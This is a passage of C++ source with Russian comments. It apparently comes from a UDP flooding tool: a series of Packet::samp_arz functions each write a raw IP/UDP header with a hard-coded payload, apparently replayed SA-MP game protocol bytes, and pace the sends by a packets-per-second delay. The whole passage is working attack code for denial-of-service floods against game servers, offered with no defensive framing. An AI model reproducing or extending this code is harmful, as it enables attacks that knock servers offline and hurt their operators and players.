	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x01\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x00\x80\x42\x68\x22\xb2\xea\x9b\xf0\x51\xd4\xb2\x01\xab\x17\xf7\x59", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 8; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe5\x02\x00\x02\x00\x02\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 35; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x07\x00\x02\x00\x64\x50\x06\x45\xa9\x83\x02\x03\x00\x87\x00\x29\x04\x00\x64\x90\x09\x52\xb8\x01\x11\x45\xa9\x83\x02\x05\x00\x87\x00\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 22; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x00\x32\x28\x06\x48\xa9\x83\x02\x07\x00\x64\x90\x09\x55\xb8\x01\x11\x48\xa9\x83\x02", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 527; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0d\x00\x48\x84\x80\x15\xe0\x14\x2b\xea\x06\x30\x60\x00\x08\xb7\xe0\xa4\x57\xb8\x42\x6c\x52\xfd\xd6\xe4\x10\x00\x08\x03\xe0\x1b\x00\x91\x09\x80\x2b\xc0\x14\x2b\xea\x0c\x40\x20\x00\x05\x21\x40\xec\x5e\xc5\x18\xd4\x32\xb8\x70\xa4\x20\x00\x08\x03\xe0\x1c\x00\x91\x0a\x00\x2b\xc0\x14\x2b\xea\x0a\x00\x20\x00\x00\x6a\xf0\xfc\x5f\x8f\x38\xb4\x39\xee\xf0\xc4\x20\x00\x08\x03\xe0\x1d\x00\x91\x0a\x80\x2b\xc0\x14\x2b\xea\x0c\x10\x20\x00\x0c\x32\xd1\x1c\x5f\x86\x38\x54\x30\x00\x0f\x04\x10\x00\x08\x03\xe0\x1e\x00\x91\x0b\x00\x2b\xc0\x14\x2b\xea\x0a\x10\x20\x00\x07\xb1\x40\xec\x5f\x07\x78\x34\x3c\xf7\x70\x94\x20\x00\x08\x03\xe0\x1f\x00\x91\x0b\x80\x2b\xc0\x14\x2b\xea\x00\xe0\x50\x00\x0a\xae\x30\x4c\x52\x90\x00\xfc\x5f\x02\x70\x84\x20\x00\x08\x03\xe0\x20\x00\x91\x0c\x00\x2b\xc0\x14\x2b\xea\x00\x20\x30\x00\x08\x1a\x70\xdc\x5c\xde\xc0\xec\x55\x60\xed\x04\x10\x00\x08\x03\xe0\x21\x00\x91\x0c\x80\x2b\xc0\x14\x2b\xea\x05\x34\x70\x00\x05\x42\x7c\xcc\x47\x1e\xd0\xbc\x5b\x81\xef\x34\x10\x00\x08\x03\xe0\x22\x00\x91\x0d\x00\x2b\xc0\x14\x2b\xea\x05\x24\x70\x00\x07\xdc\xbc\xcc\x4d\xdf\x60\xbc\x50\x00\x0f\x64\x10\x00\x08\x03\xe0\x23\x00\x91\x0d\x80\x2b\xc0\x14\x2b\xea\x00\x42\xb0\x00\x0e\xc6\xd0\x7c\x5c\xb8\x16\xcc\x3c\xf7\x72\x34\x20\x00\x08\x03\xe0\x24\x00\x91\x0e\x00\x2b\xc0\x14\x2b\xea\x00\x62\xc0\x00\x0e\xc6\xd0\x7c\x5c\xb8\x16\xcc\x3c\xf7\x72\x34\x20\x00\x08\x03\xe0\x25\x00\x91\x0e\x80\x2b\xc0\x14\x2b\xea\x05\x02\xb0\x00\x01\x06\xe0\x7c\x51\x98\x46\xcc\x39\xe6\xf2\x34\x20\x00\x08\x03\xe0\x26\x00\x91\x0f\x00\x2b\xc0\x14\x2b\xea\x01\x22\xc0\x00\x01\x06\xe0\x7c\x51\x98\x46\xcc\x39\xe6\xf2\x34\x20\x00\x08\x03\xe0\x27\x00\x91\x0f\x80\x2b\xc0\x14\x2b\xea\x04\xd2\xb0\x00\x02\xf4\x70\x7c\x5f\x49\xd6\xdc\x3b\xe9\xf2\x54\x20\x00\x08\x03\xe0\x28\x00\x91\x10\x00\x2b\xc0\x14\x2b\xea\x0f\xf2\xa0\x00\x02\xf4\x70\x7c\x50\x00\x07\x8c\x3b\xe1\xf2\x34\x20\x00\x08\x03\xe0\x29\x00\x91\x10\x80\x2b\xc0\x14\x2b\xea\x04\x92\xb0\x00\x0c\xdf\x80\x4c\x5e\x1f\xa8\x6c\x30\x00\x02\x44\x20\x00\x08\x03\xe0\x2a\x00\x91\x11\x00\x2b\xc0\x14\x2b\xea\x00\x72\xc0\x00\x0c\xdf\x80\x4c\x5e\x1f\xa8\x6c\x30\x00\x02\x44\x20\x00\x08\x03\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 546; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x40\x00\x48\x9e\x00\x15\xe0\x14\x2b\xea\x05\xa0\x50\x00\x0f\xe8\xc6\x5c\x4f\xad\xef\x7c\x35\x60\xec\xc4\x10\x00\x08\x03\xe0\x81\x00\x91\x3c\x80\x2b\xc0\x14\x2b\xea\x09\xe0\x50\x00\x0f\x6c\x86\x4c\x4f\x84\x3f\x7c\x37\x7b\xec\x74\x10\x00\x08\x03\xe0\x82\x00\x91\x3d\x00\x2b\xc0\x14\x2b\xea\x0b\x60\x50\x00\x0f\x49\x56\x7c\x4f\x03\x7f\x6c\x3d\x9c\xec\x74\x10\x00\x08\x03\xe0\x83\x00\x91\x3d\x80\x2b\xc0\x14\x2b\xea\x0d\x70\x20\x00\x0f\x86\xb6\x5c\x4f\xe6\x4e\xfc\x3d\xf4\xfc\xb4\x10\x00\x08\x03\xe0\x84\x00\x91\x3e\x00\x2b\xc0\x14\x2b\xea\x08\x50\x50\x00\x0f\xef\x46\x9c\x47\x17\xd0\x9c\x4d\xf4\xfd\x14\x10\x00\x08\x03\xe0\x85\x00\x91\x3e\x80\x2b\xc0\x14\x2b\xea\x0a\x70\x50\x00\x0f\x2a\x26\x8c\x4f\x25\x20\x9c\x49\xee\xfd\x14\x10\x00\x08\x03\xe0\x86\x00\x91\x3f\x00\x2c\xc0\x14\x6c\xeb\x02\xe0\x1f\x7f\x00\xe4\x54\xf6\xf5\x3c\x4c\x81\x31\x84\x55\x9c\xb0\x2c\x4f\xf7\xf0\x05\x00\x87\x00\x91\x3f\x80\x24\xc0\x14\x79\xe3\x02\xe0\x1f\xf0\x00\x05\x00\x88\x00\x91\x40\x00\x2b\xc0\x14\x2b\xea\x0a\x10\xd0\x00\x0d\x92\xac\x94\x45\xef\x6d\x04\x4f\xa7\xe8\x34\x10\x00\x08\x03\xe0\x89\x00\x91\x40\x80\x2b\xc0\x14\x2b\xea\x0a\x20\xd0\x00\x0d\x92\xac\x94\x45\xef\x6d\x04\x4f\xa7\xe8\x34\x10\x00\x08\x03\xe0\x8a\x00\x91\x41\x00\x2b\xc0\x14\x2b\xea\x0a\x10\xd0\x00\x09\xaa\x9d\x14\x45\xef\x6d\x04\x4f\xa7\xe8\x34\x10\x00\x08\x03\xe0\x8b\x00\x91\x41\x80\x2b\xc0\x14\x2b\xea\x0a\x20\xd0\x00\x09\xaa\x9d\x14\x45\xef\x6d\x04\x4f\xa7\xe8\x34\x10\x00\x08\x03\xe0\x8c\x00\x91\x42\x00\x2b\xc0\x14\x2b\xea\x09\x32\x00\x00\x02\x92\x4c\xd4\x41\xfa\xdc\xb4\x4b\x81\xe5\xd4\x10\x00\x08\x03\xe0\x8d\x00\x91\x42\x80\x2b\xc0\x14\x2b\xea\x09\x22\x00\x00\x02\x92\x4c\xd4\x41\xfa\xdc\xb4\x4b\x81\xe5\xd4\x10\x00\x08\x03\xe0\x8e\x00\x91\x43\x00\x2b\xc0\x14\x2b\xea\x0f\x23\x30\x00\x0d\x3c\xd4\xf4\x3e\x32\x57\x9c\x3d\xbf\x9e\x24\x00\x00\x08\x03\xe0\x8f\x00\x91\x43\x80\x2b\xc0\x14\x2b\xea\x08\x40\x50\x00\x0d\xfc\xf4\x04\x3e\x7e\xb8\x3c\x39\xee\xfe\x73\xf0\x00\x08\x03\xe0\x90\x00\x91\x44\x00\x2b\xc0\x14\x2b\xea\x08\x40\x50\x00\x0c\x37\x54\x34\x3f\x6e\x88\x7c\x39\x1e\xde\xc3\xf0\x00\x08\x03\xe0\x91\x00\x91\x44\x80\x2b\xc0\x14\x2b\xea\x08\x40\x50\x00\x0f\x4b\xd4\x84\x3f\x6e\x88\x7c\x39\x1e\xde\xc3\xf0\x00\x08\x03\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 14; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x28\x83\xc8\x8a\x81\xd1\xa0\x14\x45\xe1\x88\x80\x1f\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 49; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2e\x83\xc8\x8d\x01\xd6\xe0\x14\x89\xec\x0a\x20\x20\x00\x00\x00\x00\x01\x05\x07\x57\xa6\x17\x46\x97\x95\xf5\x06\x97\x66\xf7\xa6\x17\x67\x20\x5e\x07\x91\x1a\x83\xa3\x40\x14\x45\xe1\x8a\x20\x2f\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 368; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2a\x02\x48\x8b\xc1\x03\x30\x70\x14\x2c\xc2\x00\xee\x40\x11\xe6\xa0\x00\x0d\x04\xbd\x48\x89\xb3\x0e\xf8\x68\x73\xbf\x48\x0f\xf8\x4e\xa7\xeb\x11\xec\x48\x10\xb8\x4e\x28\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\xa0\x20\x0f\x66\xa2\x2c\x4c\xae\xcc\x6e\xad\xce\x8d\xe6\x4b\xed\x8c\x2d\x0d\x2d\x8d\x8e\x61\x2c\x6e\x4c\x2f\x4f\x2e\x0c\x2e\xcc\xa0\x00\x00\x00\x00\x21\x41\xa5\x41\xec\x2d\x2e\x4e\x0d\xee\x4e\x8c\xed\xcc\x8b\xee\x6c\xce\x6c\xa1\xac\x8c\xae\x6c\xee\x4c\xac\xad\xcc\xee\x4c\x2e\x6e\x60\x00\x00\x00\x00\x21\x60\x85\x42\x2c\x2d\x2e\x4e\x0d\xee\x4e\x8e\x4d\xec\x2c\x8e\x6b\xee\x6c\xce\x6c\xa1\x8e\x6e\x8d\xed\xcc\xae\x66\x46\xa6\xc6\x26\x47\x00\x00\x00\x00\x00\x21\xbd\x81\xc1\x8c\x4d\xef\x0d\x0e\x6c\xae\x6b\xee\x6c\xce\x6f\x01\x8e\x6e\x8d\xed\xcc\xae\xec\x2d\x8d\x8b\xed\x8c\x20\x00\x00\x00\x00\x21\xc0\x85\x42\x2c\x2d\x2e\x4e\x0d\xee\x4e\x8e\x4d\xec\x2c\x8e\x6b\xee\x6c\xce\x6c\xa1\x8e\x6e\x8d\xed\xcc\xae\x66\x46\xa6\xc6\x26\x47\x00\x00\x00\x00\x00\x55\x04\x91\x18\x02\x18\x60\x60\x14\x2c\xd4\x00\x6e\x60\x03\x01\xc0\x00\x0c\x7b\xdd\x28\x9c\x1d\x8a\x98\x73\x7c\x7f\x68\x20\x00\x00\x00\x00\x00\x00\x00\x0d\x2c\xd1\x38\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x40\x20\x20\xe4\x81\x8d\xcc\xae\xee\x6e\x8e\xac\xcc\xcb\xee\x6c\xcd\xc2\x0e\x6d\x8b\xee\x0e\x4c\xae\x6e\xec\x2d\x8d\x8c\x4d\xee\x86\x06\x20\x00\x00\x00\x00\x20\x60\xe4\x81\x8d\xcc\xae\xee\x6e\x8e\xac\xcc\xcb\xee\x6c\xcd\xc2\x0e\x6d\x8b\xee\x0e\x4c\xae\x6e\xec\x2d\x8d\x8c\x4d\xee\x86\x06\x20\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 12; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x3\x23\x00\x9f\x07\x64\x50\x06\xd1\xbc\x83\x02", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz17(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 9; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x5f\x03\xb2\x28\x06\x5d\xd0\x83\x02", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz18(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 88; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x44\x38\x6f\x87\x97\x00\xd3\xa4\x02\x3f\x04\x01\x00\x65\x64\x00\x00\x00\x00\x00\x00\x53\x0e\x03\x45\x55\xaa\xd0\xc4\x24\xe6\x50\x41\x00\x13\x88\x70\xdf\x8f\x0d\x00\x20\xc8\xb3\x02\x3f\x04\x00\x00\x00\x00\x00\x00\x63\x70\x52\xc0\x28\x4f\xba\xb1\xc0\x34\x51\x6c\xbd\x0c\x46\x67\x95\x54\x19\xdd\x4b\x53\xe5\x1b\x07\x80\x9a\x47\xf3\x00\x5f\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz19(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 121; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x22\x44\x38\x79\x87\x82\x00\x10\xcf\xa4\x00\x00\x00\x22\x74\x42\x51\x7e\xa1\xf5\xf1\x2b\x51\x15\x90\x40\x00\x00\x00\x02\x71\x37\x80\x00\x00\x00\x00\x00\x01\xa5\x04\x04\x80\x00\x45\x88\x70\xf3\x8f\x02\x00\x20\xcb\xa4\x00\x04\x3e\x70\xfd\xbd\xa3\x19\x6e\xbf\x7a\x18\xb1\xbe\x78\xd8\x09\x45\xd4\x1f\xd7\xc4\x36\x3c\x73\x41\x00\x00\x00\x00\x3f\x55\x46\x88\x70\xf4\x0f\x2e\x00\xd3\xa4\x02\x3f\x04\x01\x00\x65\x64\x00\x00\x00\x00\x00\x00\xe1\x9e\x03\x45\x0f\x34\xd2\xc4\xbb\xb9\x50\x41\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz20(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 540; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x31\x4e\xc8\x91\x5b\xa9\xe0\x1e\x1e\x48\x01\x00\x14\x24\xc6\x22\x44\x40\xdf\xff\xff\xff\xe0\x07\x1f\x88\x85\x3d\x9a\x98\x9c\x17\xcc\x68\x20\x00\x04\x08\x20\x1f\xff\xff\xff\xe4\x81\x17\xca\x45\x62\xb1\xf2\xfd\xf2\xfe\xa2\xa8\x9f\x29\xcc\x73\x1c\xc7\xef\xb5\xaa\xf6\xea\xf6\xbe\x74\x3a\x74\x05\x5e\xd2\x74\xd9\x5e\xcf\x98\xe6\x39\x8e\x6b\xe5\x21\xc7\x1c\x75\x45\x51\x3e\x53\xce\xd8\x85\x06\x4d\x7c\xa4\x56\x2b\x15\x8a\xc5\x62\xb1\xf2\x9d\xf6\x8e\x74\x2a\x74\x06\x74\x36\x74\x32\x74\x2a\x74\x31\x5e\xfc\xc3\xbe\x52\x2a\x2b\x15\x15\x8a\x8a\xc7\xca\x7a\xb7\x6d\x06\xea\xd8\xce\xd8\x85\x06\x4d\x7c\xa4\x56\x2b\x15\x8a\xc5\x62\xb1\xf2\x9d\xf6\xae\x74\x2a\x74\x05\x5e\xc1\x5e\xc3\xce\x86\xab\xdb\xab\xda\xce\x80\x98\x77\xca\x45\x45\x62\xa2\xb1\x51\x58\xf9\x4e\xad\x9a\xf9\x48\xac\x56\x2b\x15\x8a\xc5\x63\xe5\x3b\xed\x6c\xe8\x1c\xe8\x62\xbd\x8c\xe9\xa9\x87\x7c\xa4\x57\x81\x9d\xf2\xfe\x77\x56\xdf\x2f\xdf\x29\xe7\x45\xd5\xec\xe7\x42\xd5\xec\x55\xee\x95\xec\xe7\x40\x4d\x35\xf2\x91\x58\xac\x56\x2b\x15\x8a\xc7\xca\x77\xda\x29\xd0\x15\x7b\x19\xd0\x19\xd0\xf3\x0e\xf9\x71\xdf\x29\x15\xb5\x5d\x73\xb5\x57\xd5\xb5\x5d\x6f\x94\xef\xb5\x93\xa2\x13\xa2\x73\xa0\xbd\xf2\x91\x58\xac\x56\x2b\x15\x8a\xc7\xca\x77\xcb\xa3\x5f\x29\x15\x8a\xc5\x62\xb1\x58\xac\x7c\xa7\x9d\x16\x57\xb7\x9d\x0d\x9d\x03\x9d\x01\x9d\x0a\x30\xef\x97\x1d\xf2\x91\x58\xa8\xab\xad\x5e\x0a\xbf\x3b\x5f\x29\xe7\x45\x1f\x6b\x27\x44\xfb\xe5\x22\xb1\x58\xac\x56\x2b\x15\x8f\x94\xef\x97\x46\xbe\x52\x2b\x15\x8a\xc5\x62\xb1\x58\xf9\x4f\x3a\x2c\xaf\x6f\x3a\x1b\x3a\x07\x3a\x03\x3a\x15\xd5\xec\x3c\xe8\x1c\xe8\x62\xbd\xa2\xbd\x9c\xe8\x4c\xe8\x54\xe9\xb2\xbd\xfc\xe8\x4c\xe8\x64\xe8\x41\x87\x7c\xb8\xef\x94\x8a\xda\xae\xb9\xda\xab\xea\xda\xae\xb7\xca\x77\xda\xc9\xd1\x09\xd1\x39\xd0\x5e\xf9\x48\xac\x56\x2b\x15\x8a\xc5\x63\xe5\x3b\xe5\xd1\xaf\x94\x8a\xc5\x62\xb1\x58\xac\x56\x3e\x53\xbe\xd6\xab\xdb\xab\xda\xce\x80\xab\xdc\xab\xda\x4e\x84\xce\x84\x79\xd0\xb9\xd0\x95\x7b\x45\x7b\x75\x7b\x39\xd0\xc9\xd0\x15\x7b\x35\x7b\x13\x0e\xf9\x71\xdf\x29\x15\x8a\x8a\xba\xd5\xe0\xab\xf3\xb5\xf2\x9e\x74\x51\xf6\xb2\x74\x4f\xbe\x52\x2b\x15\x8a\xc5\x62\xb1\x58\xf9\x4e\xf9\x74\x69\xaf\x94\x8a\xc5\x62\xb1\x58\xac\x56\x3e\x53\xbe\xd6", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz21(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 44; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1a\xcf\x38\x5f\x0a\x42\x00\x10\xcf\xb3\x02\x00\x00\x2e\xac\x02\x91\x54\x3e\xb4\x71\x26\x26\x99\x50\x40\x00\x00\x00\x02\x94\x37\xc0\x00\x00\x00\x00\x00\x01\xa5\x04\x04\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz22(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 23; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x51\xcf\x48\x8a\x5b\xd3\xe0\x14\x6a\xe6\x04\xf0\x13\x20\x03\x00\x00\x20\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz23(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 53; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
